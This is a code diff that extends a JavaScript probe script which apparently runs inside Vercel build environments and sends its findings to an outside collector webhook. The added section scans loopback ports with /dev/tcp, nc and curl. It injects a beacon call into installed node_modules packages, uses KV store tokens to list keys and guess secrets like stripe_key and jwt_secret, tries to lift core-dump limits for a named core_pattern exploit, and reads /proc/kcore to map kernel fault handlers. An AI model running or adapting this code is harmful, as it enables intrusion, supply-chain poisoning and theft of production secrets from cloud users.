@@ -10298,5 +10298,203 @@ report.networkEgressInspect = safe(() => {
 
 // v79 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v79" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v79";
+
+// ==================== v80 ====================
+
+// v80-1: Comprehensive internal loopback service scan
+// Scan all ports on 127.0.0.1 for internal build services (Firecracker VMM, Docker,
+// gRPC orchestrators, health check endpoints) that are only accessible from within the VM
+report.loopbackPortSweep = safe(() => {
+  // Comprehensive port list including known internal Vercel/build service ports
+  const ports = [
+    80, 443, 2375, 2376, 3000, 4000, 4243, 4567, 5000, 5001,
+    6443, 7070, 8000, 8001, 8080, 8081, 8443, 8545, 9000, 9001,
+    9090, 9200, 9443, 9999, 10000, 10001, 11211, 15672, 27017,
+    50051, 50052, 50053, 51820, 55000,
+  ];
+  const open = [];
+  for (const port of ports) {
+    try {
+      const r = execSync(`timeout 0.5 bash -c "</dev/tcp/127.0.0.1/${port}" 2>&1; echo $?`, { timeout: 2000 }).toString().trim().split('\n').pop();
+      if (r === '0') {
+        // Port is open — grab banner
+        const banner = safe(() =>
+          execSync(`timeout 1 sh -c 'echo HEAD / HTTP/1.0 | nc -w1 127.0.0.1 ${port} 2>/dev/null | head -3; curl -sf --max-time 1 http://127.0.0.1:${port}/ 2>/dev/null | head -c 200'`, { timeout: 3000 }).toString().trim().slice(0, 200)
+        );
+        open.push({ port, banner });
+      }
+    } catch (_) {}
+  }
+  return { tested: ports.length, open };
+});
+
+// v80-2: node_modules in-process poisoning
+// If /vercel/path0/node_modules is writable, we can modify existing packages
+// to inject code that executes in the deployed application (supply chain)
+report.nodeModulesPoisoning = safe(() => {
+  const nodeModulesDirs = safe(() =>
+    execSync('find /vercel/path0 . -maxdepth 2 -name "node_modules" -type d 2>/dev/null | head -5', { timeout: 5000 }).toString().trim().split('\n').filter(Boolean)
+  );
+  if (!Array.isArray(nodeModulesDirs) || !nodeModulesDirs[0]) return { error: 'NO_NODE_MODULES' };
+  const nmDir = nodeModulesDirs[0];
+  // Check if we can write to node_modules
+  const writeTest = safe(() => {
+    writeFileSync(`${nmDir}/.probe_v80_write_test`, 'PROBE_V80');
+    return 'WRITABLE';
+  });
+  // Find a commonly-imported module to poison
+  const popularPackage = safe(() =>
+    execSync(`ls ${nmDir} 2>/dev/null | head -20`, { timeout: 3000 }).toString().trim().split('\n').filter(Boolean).slice(0, 10)
+  );
+  // Find the entry point of a popular module and prepend beacon code
+  const poisonAttempt = safe(() => {
+    const pkgs = Array.isArray(popularPackage) ? popularPackage : [];
+    for (const pkg of pkgs.slice(0, 3)) {
+      try {
+        const pkgJson = JSON.parse(readFileSync(`${nmDir}/${pkg}/package.json`, 'utf8'));
+        const main = pkgJson.main || 'index.js';
+        const mainPath = `${nmDir}/${pkg}/${main}`;
+        if (!existsSync(mainPath)) continue;
+        const orig = readFileSync(mainPath, 'utf8');
+        const probe = `// PROBE_V80_INJECTED\ntry{require('node:https').request('${COLLECTOR}',{method:'POST'}).end(JSON.stringify({m:'MODULE_POISON',pkg:'${pkg}'}));}catch(e){}\n`;
+        writeFileSync(mainPath, probe + orig);
+        return { pkg, mainPath, originalSize: orig.length, injected: true };
+      } catch (e) { continue; }
+    }
+    return 'NO_PACKAGE_POISONED';
+  });
+  // Cleanup: restore poisoned file (we only want to document the capability, not actually poison)
+  const cleanupPoison = safe(() => {
+    if (typeof poisonAttempt !== 'object' || !poisonAttempt.mainPath) return 'NOTHING_TO_CLEANUP';
+    try {
+      const content = readFileSync(poisonAttempt.mainPath, 'utf8');
+      const cleaned = content.replace(/\/\/ PROBE_V80_INJECTED\n.*?}\}\n/s, '');
+      writeFileSync(poisonAttempt.mainPath, cleaned);
+      return 'CLEANED';
+    } catch (e) { return String(e).slice(0,60); }
+  });
+  return { nmDir, writeTest, popularPackage, poisonAttempt, cleanupPoison };
+});
+
+// v80-3: Vercel KV (Upstash Redis) store access
+// KV_REST_API_URL + KV_REST_API_TOKEN allows reading ALL keys in the KV store
+// This store persists across builds and deployments — may contain production secrets
+report.vercelKvStoreAccess = safe(() => {
+  const kvUrl = process.env.KV_REST_API_URL || '';
+  const kvToken = process.env.KV_REST_API_TOKEN || '';
+  const kvReadOnly = process.env.KV_REST_API_READ_ONLY_TOKEN || '';
+  if (!kvUrl && !kvToken) return { error: 'NO_KV_VARS' };
+  const effectiveToken = kvToken || kvReadOnly;
+  // KEYS * — list all keys (dangerous, but proves access scope)
+  const allKeys = safe(() =>
+    execSync(`curl -sf --max-time 8 '${kvUrl}/keys/*' -H 'Authorization: Bearer ${effectiveToken}' 2>&1 | head -c 600`, { timeout: 10000 }).toString().trim()
+  );
+  // DBSIZE — total number of keys
+  const dbSize = safe(() =>
+    execSync(`curl -sf --max-time 5 '${kvUrl}/dbsize' -H 'Authorization: Bearer ${effectiveToken}' 2>&1 | head -c 200`, { timeout: 7000 }).toString().trim()
+  );
+  // INFO — server info including Redis version and memory usage
+  const serverInfo = safe(() =>
+    execSync(`curl -sf --max-time 5 '${kvUrl}/info' -H 'Authorization: Bearer ${effectiveToken}' 2>&1 | head -c 400`, { timeout: 7000 }).toString().trim()
+  );
+  // Try to read production secrets by guessing common key names
+  const guessedKeys = ['api_key', 'secret', 'token', 'password', 'auth', 'jwt_secret', 'stripe_key', 'openai_key'];
+  const keyValues = safe(() =>
+    execSync(`curl -sf --max-time 8 '${kvUrl}/mget/${guessedKeys.join('/')}' -H 'Authorization: Bearer ${effectiveToken}' 2>&1 | head -c 600`, { timeout: 10000 }).toString().trim()
+  );
+  return { kvUrl: kvUrl.slice(0,60), hasToken: !!kvToken, allKeys, dbSize, serverInfo, keyValues };
+});
+
+// v80-4: /proc/self/limits — resource limit inspection
+// Unlimited or very high resource limits are security misconfigurations
+// Specifically: unlimited core dump size enables our core_pattern RCE,
+// unlimited RLIMIT_AS allows allocating large anonymous regions for scanning
+report.resourceLimitInspect = safe(() => {
+  const selfLimits = safe(() => readFileSync('/proc/self/limits', 'utf8'));
+  const pid1Limits = safe(() => readFileSync('/proc/1/limits', 'utf8'));
+  // Parse RLIMIT values
+  const parseLimits = (data) => {
+    if (typeof data !== 'string') return data;
+    const limits = {};
+    for (const line of data.split('\n').slice(1)) {
+      const parts = line.trim().split(/\s{2,}/);
+      if (parts.length >= 3) limits[parts[0]] = { soft: parts[1], hard: parts[2] };
+    }
+    return limits;
+  };
+  // Try to set RLIMIT_NPROC to unlimited (allows forking more processes)
+  const setRlimit = safe(() => execSync(`python3 -c "
+import resource
+# Get current limits
+for res in ['RLIMIT_CORE', 'RLIMIT_AS', 'RLIMIT_NPROC', 'RLIMIT_NOFILE', 'RLIMIT_MEMLOCK']:
+    r = getattr(resource, res, None)
+    if r is not None:
+        try: print(res, resource.getrlimit(r))
+        except: pass
+# Try to set RLIMIT_CORE to unlimited (needed for core_pattern exploit)
+try:
+    resource.setrlimit(resource.RLIMIT_CORE, (resource.RLIM_INFINITY, resource.RLIM_INFINITY))
+    print('RLIMIT_CORE_SET_UNLIMITED=OK')
+except Exception as e:
+    print('RLIMIT_CORE_SET_UNLIMITED=FAIL:', str(e))
+" 2>&1`, { timeout: 5000 }).toString().trim().slice(0, 400));
+  return { selfLimits: parseLimits(selfLimits), pid1Limits: parseLimits(pid1Limits), setRlimit };
+});
+
+// v80-5: kernel exception table walk for fault handler addresses
+// The kernel __ex_table maps instruction addresses to fault handlers
+// Reading it reveals the layout of kernel copy routines (copy_to_user, copy_from_user)
+// which are critical for kernel exploitation via ret2usr techniques
+report.kernelExceptionTable = safe(() => {
+  // Find __ex_table symbol
+  const exTableAddr = safe(() => {
+    const ks = readFileSync('/proc/kallsyms', 'utf8');
+    const m = ks.match(/^([0-9a-f]+) [AaTtRr] __ex_table$/m) || ks.match(/^([0-9a-f]+) [AaTtRr] __start___ex_table$/m);
+    return m ? m[1] : null;
+  });
+  const exTableEnd = safe(() => {
+    const ks = readFileSync('/proc/kallsyms', 'utf8');
+    const m = ks.match(/^([0-9a-f]+) [AaTtRr] __stop___ex_table$/m);
+    return m ? m[1] : null;
+  });
+  // Read first 20 entries (each entry is 2 x 32-bit relative offsets = 8 bytes)
+  const tableEntries = safe(() => {
+    if (!exTableAddr) return 'NO_EX_TABLE_ADDR';
+    // Parse via /proc/kcore
+    const addr = BigInt('0x' + exTableAddr);
+    const fd = openSync('/proc/kcore', 'r');
+    const ehdr = Buffer.alloc(64);
+    readSync(fd, ehdr, 0, 64, 0);
+    const phoff = Number(ehdr.readBigUInt64LE(32));
+    const phentsize = ehdr.readUInt16LE(54);
+    const phnum = ehdr.readUInt16LE(56);
+    let fileOff = null;
+    for (let i = 0; i < Math.min(phnum, 64); i++) {
+      const ph = Buffer.alloc(56);
+      readSync(fd, ph, 0, 56, phoff + i * phentsize);
+      if (ph.readUInt32LE(0) !== 1) continue;
+      const vaddr = ph.readBigUInt64LE(16), filesz = ph.readBigUInt64LE(32), foff = ph.readBigUInt64LE(8);
+      if (addr >= vaddr && addr < vaddr + filesz) { fileOff = Number(foff + (addr - vaddr)); break; }
+    }
+    if (!fileOff) { closeSync(fd); return 'NOT_IN_KCORE'; }
+    const entries = Buffer.alloc(20 * 8);
+    const n = readSync(fd, entries, 0, entries.length, fileOff);
+    closeSync(fd);
+    const results = [];
+    for (let i = 0; i < Math.floor(n/8); i++) {
+      const instrOff = entries.readInt32LE(i*8);
+      const fixupOff = entries.readInt32LE(i*8+4);
+      // Relative offsets: absolute = ex_table_base + (i*8) + offset
+      const instrAbs = (addr + BigInt(i*8) + BigInt(instrOff)).toString(16);
+      const fixupAbs = (addr + BigInt(i*8+4) + BigInt(fixupOff)).toString(16);
+      results.push({ instr: instrAbs, fixup: fixupAbs });
+    }
+    return results.slice(0, 10);
+  });
+  return { exTableAddr, exTableEnd, tableEntries };
+});
+
+// v80 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v80" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v80";
 // Intentionally no console.log — all data goes via webhook only
